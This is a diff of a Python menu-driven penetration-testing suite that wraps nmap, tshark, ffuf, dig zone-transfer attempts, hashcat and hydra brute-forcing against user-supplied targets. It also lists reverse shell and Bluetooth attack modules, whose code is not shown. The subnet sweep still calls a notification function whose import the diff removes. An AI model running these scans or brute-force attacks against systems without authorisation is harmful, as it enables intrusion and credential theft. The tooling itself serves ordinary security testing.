@@ -4,46 +4,47 @@ import os
 import shutil
 import subprocess
 import re
+import base64
 from magic_hat.database import log_scan, get_scan_logs, get_connection
-from magic_hat.utils import BANNER_IMAGE, clear_screen, get_all_device_ips, print_tactical_header, get_subnet_range, send_webhook_notification
+from magic_hat.utils import BANNER_IMAGE, clear_screen, get_all_device_ips, print_tactical_header, get_subnet_range, send_notification, Colors
 import qrcode  # Requires: pip install qrcode
 import socket
 
 def display_offensive_suite():
     while True:
         clear_screen()
-        print(BANNER_IMAGE)
-        print("       === OFFENSIVE & TACTICAL DEPLOYMENT SUITE ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"{Colors.YELLOW}{Colors.HEADER}=== OFFENSIVE & TACTICAL DEPLOYMENT SUITE ==={Colors.ENDC}".center(60))
         print("=" * 60)
-        print("                  --- RECON & PROFILING ---")
+        print(f"{Colors.YELLOW}--- RECON & PROFILING ---{Colors.ENDC} ".center(60, " "))
         print("-" * 60)
-        print("1. Nmap Deep Recon & Target Profiler")
-        print("2. Net Shark Packet Capture (tshark)")
-        print("3. Web Directory Fuzzer (ffuf)")
-        print("4. DNS Footprinting (dig)")
-        print("5. Web Tech Stack Fingerprinting (whatweb)")
-        print("6. Wireless & RF Footprinting")
+        print(f"{Colors.BOLD}1.{Colors.ENDC} Recon & Target Profiler")
+        print(f"{Colors.BOLD}2.{Colors.ENDC} Net Shark Packet Capture (tshark)")
+        print(f"{Colors.BOLD}3.{Colors.ENDC} Web Directory Fuzzer (ffuf)")
+        print(f"{Colors.BOLD}4.{Colors.ENDC} DNS Footprinting (dig)")
+        print(f"{Colors.BOLD}5.{Colors.ENDC} Web Tech Stack Fingerprinting (whatweb)")
+        print(f"{Colors.BOLD}6.{Colors.ENDC} Wireless & RF Footprinting")
         print("-" * 60)
-        print("              --- AUDITING & EXPLOITATION ---")
+        print(f"{Colors.YELLOW}--- AUDITING & EXPLOITATION ---{Colors.ENDC}".center(60, " "))
         print("-" * 60)
-        print("7. SSH & PowerShell Remote Auditors")
-        print("8. Hash Identifier & Cracking Assistant")
-        print("9. Exploit Database Search (searchsploit)")
-        print("10. Credential Service Auditor (hydra)")
+        print(f"{Colors.BOLD}7.{Colors.ENDC} SSH & PowerShell Remote Auditors")
+        print(f"{Colors.BOLD}8.{Colors.ENDC} Hash Identifier & Cracking Assistant")
+        print(f"{Colors.BOLD}9.{Colors.ENDC} Exploit Database Search (searchsploit)")
+        print(f"{Colors.BOLD}10.{Colors.ENDC} Credential Service Auditor (hydra)")
         print("-" * 60)
-        print("             --- TACTICAL DEPLOYMENT & UTILS ---")
+        print(f"{Colors.YELLOW}--- TACTICAL DEPLOYMENT & UTILS ---{Colors.ENDC}".center(60, " "))
         print("-" * 60)
-        print("11. Cryptographic Engine (Base64/XOR)")
-        print("12. Tactical Reverse Shell Generator")
-        print("13. ASCII QR Code Payload Generator")
-        print("14. Bluetooth Attack & SDP Suite")
-        print("15. Wireless Monitor Mode Manager")
-        print("16. Wordlist Manager")
-        print("-" * 60)
-        print("99. Back to Lifecycle Menu (b)")
+        print(f"{Colors.BOLD}11.{Colors.ENDC} Cryptographic Engine (Base64/XOR)")
+        print(f"{Colors.BOLD}12.{Colors.ENDC} Tactical Reverse Shell Generator")
+        print(f"{Colors.BOLD}13.{Colors.ENDC} ASCII QR Code Payload Generator")
+        print(f"{Colors.BOLD}14.{Colors.ENDC} Bluetooth Attack & SDP Suite")
+        print(f"{Colors.BOLD}15.{Colors.ENDC} Wireless Monitor Mode Manager")
+        print(f"{Colors.BOLD}16.{Colors.ENDC} Wordlist Manager")
+        print("=" * 60)
+        print(f"{Colors.RED}99. Back to Lifecycle Menu (b){Colors.ENDC}".center(60, " "))
         print("=" * 60)
         
-        choice = input("Select tactical module [1-16, or 99/b]: ").strip().lower()
+        choice = input(f"{Colors.YELLOW}Select tactical module [1-16, or 99/b]: {Colors.ENDC}").strip().lower()
         if choice in ["99", "b", "back"]:
             break
         elif choice == "1":
@@ -79,7 +80,7 @@ def display_offensive_suite():
         elif choice == "16":
             handle_wordlist_manager()
         else:
-            input("Invalid choice! Press Enter to try again...")
+            input(f"{Colors.RED}Invalid choice! Press Enter to try again...{Colors.ENDC}")
 
 def parse_open_ports(nmap_output):
     """Extract open ports and services from Nmap stdout using regex."""
@@ -99,12 +100,10 @@ def parse_nmap_deep_telemetry(nmap_output):
         "device_type": "Unknown"
     }
     
-    # Parse open ports & services
     port_pattern = re.compile(r"^(\d+/(?:tcp|udp))\s+open\s+([^\s]+)\s*(.*)$", re.MULTILINE)
     for port_proto, service, desc in port_pattern.findall(nmap_output):
         telemetry["open_ports"].append({"port": port_proto, "service": service.strip(), "details": desc.strip()})
         
-    # Parse OS detection hints
     os_pattern = re.compile(r"OS details:\s+(.*)$", re.MULTILINE)
     os_match = os_pattern.search(nmap_output)
     if os_match:
@@ -115,7 +114,6 @@ def parse_nmap_deep_telemetry(nmap_output):
         if running_match:
             telemetry["os_guess"] = running_match.group(1).strip()
 
-    # Parse MAC address & Vendor
     mac_pattern = re.compile(r"MAC Address:\s+([0-9A-Fa-f:]+\s+\([^)]+\))", re.MULTILINE)
     mac_match = mac_pattern.search(nmap_output)
     if mac_match:
@@ -123,27 +121,47 @@ def parse_nmap_deep_telemetry(nmap_output):
         
     return telemetry
 
+def print_target_context(tool_title):
+    """Print tactical header, active network interfaces/subnets, and page title."""
+    clear_screen()
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+    print_tactical_header()
+    
+    ips = get_all_device_ips()
+    print(f"{Colors.YELLOW}[*] Active Interfaces & Host Spaces:{Colors.ENDC}")
+    if ips:
+        for iface, ip_cidr in ips:
+            subnet = get_subnet_range(ip_cidr)
+            print(f"    - [{iface}] IP: {ip_cidr} | Subnet: {subnet}")
+    else:
+        print(f"    {Colors.RED}[!] No active network interfaces detected (Check Wi-Fi / Hotspot){Colors.ENDC}")
+        
+    print("-" * 60)
+    print(tool_title.center(60))
+    print("-" * 60)
+
+
 def handle_nmap_menu():
     """Interactive Nmap scan selection and execution menu with deep target profiling."""
     while True:
         clear_screen()
-        print(BANNER_IMAGE)
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
         print_tactical_header()
-        print("       === PAGE: NMAP DEEP RECON & TARGET PROFILER ===")
+        print("=== PAGE: NMAP DEEP RECON & TARGET PROFILER ===".center(60))
         print("-" * 60)
         print("1. Quick Port Scan (-T4)")
         print("2. Service & Version Detection (-sV -T4)")
         print("3. Comprehensive Target Profile (OS, Scripts, Versions: -A -sC -T4)")
         print("4. Full Port Sweep (-p- -T4)")
         print("5. Custom Flags")
-        print("99. Back to Suite Menu (b)")
+        print(f"{Colors.RED}99. Back to Suite Menu (b){Colors.ENDC}")
         print("-" * 60)
         
-        choice = input("Select profile [1-5, or 99/b]: ").strip().lower()
+        choice = input(f"{Colors.YELLOW}Select profile [1-5, or 99/b]: {Colors.ENDC}").strip().lower()
         if choice in ["99", "b", "back"]:
             break
             
-        target = input("Enter target IP, hostname, or CIDR (or 'b' to back): ").strip()
+        target = input(f"{Colors.YELLOW}Enter target IP, hostname, or CIDR (or 'b' to back): {Colors.ENDC}").strip()
         if target.lower() in ["b", "99", "back", ""]:
             continue
             
@@ -153,32 +171,31 @@ def handle_nmap_menu():
         elif choice == "2":
             flags = ["-sV", "-T4"]
         elif choice == "3":
-            flags = ["-A", "-sC", "-T4"]  # Aggressive + Script scan + OS detection
+            flags = ["-A", "-sC", "-T4"]
         elif choice == "4":
             flags = ["-p-", "-T4"]
         elif choice == "5":
-            custom = input("Enter custom nmap arguments (e.g., -p 1-1000 -O): ").strip()
+            custom = input(f"{Colors.YELLOW}Enter custom nmap arguments (e.g., -p 1-1000 -O): {Colors.ENDC}").strip()
             if custom.lower() in ["b", "99", "back"]:
                 continue
             flags = custom.split()
         else:
-            input("Invalid selection! Press Enter to continue...")
+            input(f"{Colors.RED}Invalid selection! Press Enter to continue...{Colors.ENDC}")
             continue
             
-        print(f"\n[+] Launching Nmap target profiler on {target} with flags: {' '.join(flags)}")
-        print("[*] Performing deep enumeration (this may take a moment)...")
+        print(f"{Colors.GREEN}\n[+] Launching Nmap target profiler on {target} with flags: {' '.join(flags)}{Colors.ENDC}")
+        print(f"{Colors.YELLOW}[*] Performing deep enumeration (this may take a moment)...{Colors.ENDC}")
         try:
             cmd = ["nmap"] + flags + [target]
             result = subprocess.run(cmd, capture_output=True, text=True, check=True)
             output = result.stdout
             
-            # Extract structured telemetry
             telemetry = parse_nmap_deep_telemetry(output)
             
             clear_screen()
-            print(BANNER_IMAGE)
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
             print_tactical_header()
-            print(f"=== DEEP RECON REPORT: {target} ===")
+            print(f"=== DEEP RECON REPORT: {target} ===".center(60))
             print("-" * 60)
             print(f"[*] Target OS Guess : {telemetry['os_guess']}")
             print(f"[*] MAC / Hardware  : {telemetry['mac_address']}")
@@ -194,107 +211,107 @@ def handle_nmap_menu():
                 print(output[:1500])
             print("-" * 60)
             
-            # Log scan with structured metadata for reporting and dashboard
             log_scan("Nmap Deep Recon", target, output, metadata=telemetry)
-            print("[✔] Rich target profile logged successfully to database.")
+            print(f"{Colors.GREEN}[✔] Rich target profile logged successfully to database.{Colors.ENDC}")
         except subprocess.CalledProcessError as e:
-            print(f"\n[-] Nmap failed: {e.stderr or str(e)}")
+            print(f"{Colors.RED}\n[-] Nmap failed: {e.stderr or str(e)}{Colors.ENDC}")
         except FileNotFoundError:
-            print("\n[-] Error: 'nmap' binary not found. Run 'pkg install nmap'.")
+            print(f"{Colors.RED}\n[-] Error: 'nmap' binary not found. Run 'pkg install nmap'.{Colors.ENDC}")
             
-        input("\nPress Enter to return...")
+        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_net_shark():
     """Tool 2: Net Shark (Packet Capture / tshark)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("=== PAGE: NET SHARK (PACKET CAPTURE) ===")
+    print("=== PAGE: NET SHARK (PACKET CAPTURE) ===".center(60))
+    print("-" * 60)
     
     ips = get_all_device_ips()
-    print("[*] Available Interfaces:")
+    print(f"{Colors.YELLOW}[*] Available Interfaces:{Colors.ENDC}")
     for iface, ip in ips:
         print(f"    - {iface} ({ip})")
     print("-" * 60)
     
-    iface = input("Enter interface to sniff (e.g., wlan0, rmnet0) or 'b' to back: ").strip()
+    iface = input(f"{Colors.YELLOW}Enter interface to sniff (e.g., wlan0, rmnet0) or 'b' to back: {Colors.ENDC}").strip()
     if iface.lower() in ["b", "99", "back", ""]:
         return
         
-    count = input("Enter packet count limit (default 20): ").strip() or "20"
+    count = input(f"{Colors.YELLOW}Enter packet count limit (default 20): {Colors.ENDC}").strip() or "20"
     
-    print(f"\n[+] Initializing Net Shark on {iface} (capturing {count} packets)...")
-    print("[*] Press Ctrl+C if you need to abort early.\n")
+    print(f"{Colors.GREEN}\n[+] Initializing Net Shark on {iface} (capturing {count} packets)...{Colors.ENDC}")
+    print(f"{Colors.YELLOW}[*] Press Ctrl+C if you need to abort early.\n{Colors.ENDC}")
     try:
         cmd = ["tshark", "-i", iface, "-c", str(count)]
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
         print_tactical_header()
-        print(f"=== PACKET CAPTURE RESULTS: {iface} ===")
+        print(f"=== PACKET CAPTURE RESULTS: {iface} ===".center(60))
         print(output)
         
         log_scan("Net Shark", iface, output)
-        print("\n[✔] Packet capture logged to database.")
+        print(f"{Colors.GREEN}\n[✔] Packet capture logged to database.{Colors.ENDC}")
     except subprocess.CalledProcessError as e:
-        print(f"\n[-] Tshark failed: {e.stderr or str(e)}")
-        print("[-] Note: Sniffing cellular interfaces (like rmnet0) requires root privileges.")
+        print(f"{Colors.RED}\n[-] Tshark failed: {e.stderr or str(e)}{Colors.ENDC}")
+        print(f"{Colors.YELLOW}[-] Note: Sniffing cellular interfaces (like rmnet0) requires root privileges.{Colors.ENDC}")
     except FileNotFoundError:
-        print("\n[-] Error: 'tshark' not found in path. Run 'pkg install tshark'.")
+        print(f"{Colors.RED}\n[-] Error: 'tshark' not found in path. Run 'pkg install tshark'.{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_web_fuzzer():
     """Tool 3: Web Directory Fuzzer (ffuf wrapper)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("             === PAGE: WEB DIR FUZZER (FFUF) ===")
+    print("=== PAGE: WEB DIR FUZZER (FFUF) ===".center(60))
     print("-" * 60)
     
-    url = input("Enter target URL (e.g., http://10.0.0.1/FUZZ) or 'b' to back: ").strip()
+    url = input(f"{Colors.YELLOW}Enter target URL (e.g., http://10.0.0.1/FUZZ) or 'b' to back: {Colors.ENDC}").strip()
     if url.lower() in ["b", "99", "back", ""]:
         return
         
     if "FUZZ" not in url:
-        print("[!] Note: 'FUZZ' keyword missing in URL. Appending '/FUZZ'.")
+        print(f"{Colors.YELLOW}[!] Note: 'FUZZ' keyword missing in URL. Appending '/FUZZ'.{Colors.ENDC}")
         url = url.rstrip("/") + "/FUZZ"
         
-    wordlist = input("Enter wordlist path (default: /data/data/com.termux/files/usr/share/wordlists/dirb/common.txt): ").strip()
+    wordlist = input(f"{Colors.YELLOW}Enter wordlist path: {Colors.ENDC}").strip()
     if not wordlist:
         wordlist = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
         
-    print(f"\n[+] Launching FFUF fuzzer against {url}...")
+    print(f"{Colors.GREEN}\n[+] Launching FFUF fuzzer against {url}...{Colors.ENDC}")
     try:
         cmd = ["ffuf", "-u", url, "-w", wordlist, "-s"]
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
-        print(f"=== FFUF DISCOVERY RESULTS ===")
-        print(output if output else "[*] Scan completed, but no standard output captured.")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"=== FFUF DISCOVERY RESULTS ===".center(60))
+        print(output if output else f"{Colors.YELLOW}[*] Scan completed, but no standard output captured.{Colors.ENDC}")
         
         log_scan("Web Fuzzer", url, output)
-        print("\n[✔] Web fuzzing results successfully logged to database.")
+        print(f"{Colors.GREEN}\n[✔] Web fuzzing results successfully logged to database.{Colors.ENDC}")
     except subprocess.CalledProcessError as e:
-        print(f"\n[-] FFUF failed: {e.stderr or str(e)}")
+        print(f"{Colors.RED}\n[-] FFUF failed: {e.stderr or str(e)}{Colors.ENDC}")
     except FileNotFoundError:
-        print("\n[-] Error: 'ffuf' binary not found. Run 'pkg install ffuf'.")
+        print(f"{Colors.RED}\n[-] Error: 'ffuf' binary not found. Run 'pkg install ffuf'.{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_dns_recon():
     """Tool 4: DNS Recon (dig wrapper)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("            === PAGE: DNS FOOTPRINTING (DIG) ===")
+    print("=== PAGE: DNS FOOTPRINTING (DIG) ===".center(60))
     print("-" * 60)
     
-    domain = input("Enter target domain or hostname (or 'b' to back): ").strip()
+    domain = input(f"{Colors.YELLOW}Enter target domain or hostname (or 'b' to back): {Colors.ENDC}").strip()
     if domain.lower() in ["b", "99", "back", ""]:
         return
         
@@ -303,14 +320,14 @@ def handle_dns_recon():
     print("2. All Records (ANY)")
     print("3. Zone Transfer Attempt (AXFR)")
     
-    choice = input("Select query type [1-3]: ").strip()
+    choice = input(f"{Colors.YELLOW}Select query type [1-3]: {Colors.ENDC}").strip()
     qtype = ""
     if choice == "2":
         qtype = "ANY"
     elif choice == "3":
         qtype = "AXFR"
         
-    print(f"\n[+] Querying DNS records for {domain}...")
+    print(f"{Colors.GREEN}\n[+] Querying DNS records for {domain}...{Colors.ENDC}")
     try:
         cmd = ["dig", domain]
         if qtype:
@@ -320,57 +337,57 @@ def handle_dns_recon():
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
-        print(f"=== DNS RESULTS ({domain}) ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"=== DNS RESULTS ({domain}) ===".center(60))
         print(output)
         
         log_scan("DNS Recon", domain, output)
-        print("\n[✔] DNS footprint logged to database.")
+        print(f"{Colors.GREEN}\n[✔] DNS footprint logged to database.{Colors.ENDC}")
     except subprocess.CalledProcessError as e:
-        print(f"\n[-] Dig failed: {e.stderr or str(e)}")
+        print(f"{Colors.RED}\n[-] Dig failed: {e.stderr or str(e)}{Colors.ENDC}")
     except FileNotFoundError:
-        print("\n[-] Error: 'dig' binary not found. Run 'pkg install dnsutils'.")
+        print(f"{Colors.RED}\n[-] Error: 'dig' binary not found. Run 'pkg install dnsutils'.{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_tech_fingerprint():
     """Tool 5: Web Tech Fingerprinting (whatweb wrapper)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("        === PAGE: WEB TECH FINGERPRINT (WHATWEB) ===")
+    print("=== PAGE: WEB TECH FINGERPRINT (WHATWEB) ===".center(60))
     print("-" * 60)
     
-    target = input("Enter target URL or IP (or 'b' to back): ").strip()
+    target = input(f"{Colors.YELLOW}Enter target URL or IP (or 'b' to back): {Colors.ENDC}").strip()
     if target.lower() in ["b", "99", "back", ""]:
         return
         
-    print(f"\n[+] Fingerprinting technology stack for {target}...")
+    print(f"{Colors.GREEN}\n[+] Fingerprinting technology stack for {target}...{Colors.ENDC}")
     try:
         cmd = ["whatweb", target]
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
-        print(f"=== TECH STACK REPORT: {target} ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"=== TECH STACK REPORT: {target} ===".center(60))
         print(output)
         
         log_scan("Tech Fingerprint", target, output)
-        print("\n[✔] Fingerprint results logged to database.")
+        print(f"{Colors.GREEN}\n[✔] Fingerprint results logged to database.{Colors.ENDC}")
     except subprocess.CalledProcessError as e:
-        print(f"\n[-] WhatWeb failed: {e.stderr or str(e)}")
+        print(f"{Colors.RED}\n[-] WhatWeb failed: {e.stderr or str(e)}{Colors.ENDC}")
     except FileNotFoundError:
-        print("\n[-] Error: 'whatweb' binary not found. Ensure it is installed in Termux.")
+        print(f"{Colors.RED}\n[-] Error: 'whatweb' binary not found. Ensure it is installed in Termux.{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_subnet_sweep():
     """Tool 6: Local Subnet Discovery & ARP Sweeping."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("            === PAGE: SUBNET & ARP DISCOVERY ===")
+    print("=== PAGE: SUBNET & ARP DISCOVERY ===".center(60))
     print("-" * 60)
     
     ips = get_all_device_ips()
@@ -379,44 +396,44 @@ def handle_subnet_sweep():
         _, ip_c = ips[0]
         default_sub = get_subnet_range(ip_c)
         
-    subnet = input(f"Enter target CIDR [default {default_sub}] or 'b' to back: ").strip()
+    subnet = input(f"{Colors.YELLOW}Enter target CIDR [default {default_sub}] or 'b' to back: {Colors.ENDC}").strip()
     if subnet.lower() in ["b", "99", "back"]:
         return
     target_sub = subnet if subnet else default_sub
         
-    print(f"\n[+] Sweeping subnet {target_sub} for live hosts...")
+    print(f"{Colors.GREEN}\n[+] Sweeping subnet {target_sub} for live hosts...{Colors.ENDC}")
     try:
         cmd = ["nmap", "-sn", target_sub]
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
         print_tactical_header()
-        print(f"=== LIVE HOST DISCOVERY: {target_sub} ===")
+        print(f"=== LIVE HOST DISCOVERY: {target_sub} ===".center(60))
         print(output)
         
         log_scan("Subnet Sweep", target_sub, output)
         send_webhook_notification("Subnet Sweep Complete", f"Discovered live hosts on {target_sub}")
-        print("\n[✔] Sweep results logged and webhook triggered.")
+        print(f"{Colors.GREEN}\n[✔] Sweep results logged and webhook triggered.{Colors.ENDC}")
     except Exception as e:
-        print(f"\n[-] Sweep failed: {e}")
+        print(f"{Colors.RED}\n[-] Sweep failed: {e}{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_wireless_recon():
     """Tool 7: Wireless & RF Footprinting Wrapper."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("            === PAGE: WIRELESS & RF FOOTPRINTING ===")
+    print("=== PAGE: WIRELESS & RF FOOTPRINTING ===".center(60))
     print("-" * 60)
     print("1. List Wireless Interfaces & Status (iw / nmcli)")
     print("2. Scan Nearby Wi-Fi Networks")
-    print("99. Back to Suite Menu (b)")
+    print(f"{Colors.RED}99. Back to Suite Menu (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
     elif choice == "1":
@@ -426,33 +443,33 @@ def handle_wireless_recon():
     else:
         return
         
-    print("\n[+] Querying wireless subsystem...")
+    print(f"{Colors.GREEN}\n[+] Querying wireless subsystem...{Colors.ENDC}")
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
         print_tactical_header()
-        print("=== WIRELESS RECON REPORT ===")
-        print(output if output else "[*] Command executed but returned no output.")
+        print("=== WIRELESS RECON REPORT ===".center(60))
+        print(output if output else f"{Colors.YELLOW}[*] Command executed but returned no output.{Colors.ENDC}")
         
         log_scan("Wireless Recon", "Local RF", output)
-        print("\n[✔] Wireless telemetry logged to database.")
+        print(f"{Colors.GREEN}\n[✔] Wireless telemetry logged to database.{Colors.ENDC}")
     except Exception as e:
-        print(f"\n[-] Wireless command failed: {e}")
+        print(f"{Colors.RED}\n[-] Wireless command failed: {e}{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_hash_identifier():
     """Tool 8: Hash Identification & Cracking Assistant."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("=== PAGE: HASH IDENTIFIER & AUDIT ===")
+    print("=== PAGE: HASH IDENTIFIER & AUDIT ===".center(60))
     print("-" * 60)
     
-    hash_str = input("Enter hash string to analyze (or 'b' to back): ").strip()
+    hash_str = input(f"{Colors.YELLOW}Enter hash string to analyze (or 'b' to back): {Colors.ENDC}").strip()
     if hash_str.lower() in ["b", "99", "back", ""]:
         return
         
@@ -473,9 +490,9 @@ def handle_hash_identifier():
         identified.append("Unknown or complex hash format")
         
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("=== HASH ANALYSIS RESULTS ===")
+    print("=== HASH ANALYSIS RESULTS ===".center(60))
     print(f"[*] Input Hash: {hash_str}")
     print(f"[*] Length: {length} characters")
     print("[*] Potential Formats:")
@@ -483,100 +500,100 @@ def handle_hash_identifier():
         print(f"    - {fmt}")
     print("-" * 60)
     
-    run_crack = input("Would you like to invoke hashcat against this hash? (y/n): ").strip().lower()
+    run_crack = input(f"{Colors.YELLOW}Would you like to invoke hashcat against this hash? (y/n): {Colors.ENDC}").strip().lower()
     if run_crack == 'y':
-        mode = input("Enter hashcat mode number (e.g., 0 for MD5, 1000 for NTLM): ").strip()
-        wordlist = input("Enter wordlist path: ").strip()
+        mode = input(f"{Colors.YELLOW}Enter hashcat mode number (e.g., 0 for MD5, 1000 for NTLM): {Colors.ENDC}").strip()
+        wordlist = input(f"{Colors.YELLOW}Enter wordlist path: {Colors.ENDC}").strip()
         if mode and wordlist:
-            print("\n[+] Launching hashcat audit...")
+            print(f"{Colors.GREEN}\n[+] Launching hashcat audit...{Colors.ENDC}")
             try:
                 cmd = ["hashcat", "-a", "0", "-m", mode, hash_str, wordlist]
                 res = subprocess.run(cmd, capture_output=True, text=True, check=True)
                 print(res.stdout)
                 log_scan("Hash Audit", hash_str, res.stdout)
             except Exception as e:
-                print(f"[-] Hashcat execution failed: {e}")
+                print(f"{Colors.RED}\n[-] Hashcat execution failed: {e}{Colors.ENDC}")
                 
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_exploit_search():
     """Tool 9: Exploit Search Engine (searchsploit wrapper)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("             === PAGE: EXPLOIT SEARCH ENGINE ===")
+    print("=== PAGE: EXPLOIT SEARCH ENGINE ===".center(60))
     print("-" * 60)
     
-    query = input("Enter service or software version (e.g., 'apache 2.4', 'vsftpd 2.3.4') or 'b' to back: ").strip()
+    query = input(f"{Colors.YELLOW}Enter service or software version (e.g., 'apache 2.4') or 'b' to back: {Colors.ENDC}").strip()
     if query.lower() in ["b", "99", "back", ""]:
         return
         
-    print(f"\n[+] Querying local exploit database for '{query}'...")
+    print(f"{Colors.GREEN}\n[+] Querying local exploit database for '{query}'...{Colors.ENDC}")
     try:
         cmd = ["searchsploit", query]
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
-        print(f"=== EXPLOIT RESULTS: {query} ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"=== EXPLOIT RESULTS: {query} ===".center(60))
         print(output)
         
         log_scan("Exploit Search", query, output)
-        print("\n[✔] Exploit search results logged to database.")
+        print(f"{Colors.GREEN}\n[✔] Exploit search results logged to database.{Colors.ENDC}")
     except FileNotFoundError:
-        print("\n[-] Error: 'searchsploit' binary not found. Install exploitdb.")
+        print(f"{Colors.RED}\n[-] Error: 'searchsploit' binary not found. Install exploitdb.{Colors.ENDC}")
     except Exception as e:
-        print(f"\n[-] Searchsploit failed: {e}")
+        print(f"{Colors.RED}\n[-] Searchsploit failed: {e}{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_hydra_audit():
     """Tool 10: Credential & Service Auditor (hydra wrapper)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("          === PAGE: CREDENTIAL AUDITOR (HYDRA) ===")
+    print("=== PAGE: CREDENTIAL AUDITOR (HYDRA) ===".center(60))
     print("-" * 60)
     
-    target = input("Enter target IP/hostname (or 'b' to back): ").strip()
+    target = input(f"{Colors.YELLOW}Enter target IP/hostname (or 'b' to back): {Colors.ENDC}").strip()
     if target.lower() in ["b", "99", "back", ""]:
         return
-    service = input("Enter service protocol (ssh, ftp, http-post-form): ").strip()
-    user = input("Enter username or user file path: ").strip()
-    wordlist = input("Enter password wordlist path: ").strip()
+    service = input(f"{Colors.YELLOW}Enter service protocol (ssh, ftp, http-post-form): {Colors.ENDC}").strip()
+    user = input(f"{Colors.YELLOW}Enter username or user file path: {Colors.ENDC}").strip()
+    wordlist = input(f"{Colors.YELLOW}Enter password wordlist path: {Colors.ENDC}").strip()
     
     if not all([target, service, user, wordlist]):
-        input("\n[-] All fields are required. Press Enter to return...")
+        input(f"{Colors.RED}\n[-] All fields are required. Press Enter to return...{Colors.ENDC}")
         return
         
-    print(f"\n[+] Launching Hydra brute-force audit against {target} ({service})...")
+    print(f"{Colors.GREEN}\n[+] Launching Hydra brute-force audit against {target} ({service})...{Colors.ENDC}")
     try:
         cmd = ["hydra", "-l", user, "-P", wordlist, target, service]
         result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         output = result.stdout
         
         clear_screen()
-        print(BANNER_IMAGE)
-        print(f"=== HYDRA AUDIT RESULTS ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"=== HYDRA AUDIT RESULTS ===".center(60))
         print(output)
         
         log_scan("Hydra Audit", f"{service}://{target}", output)
-        print("\n[✔] Credential audit logged to database.")
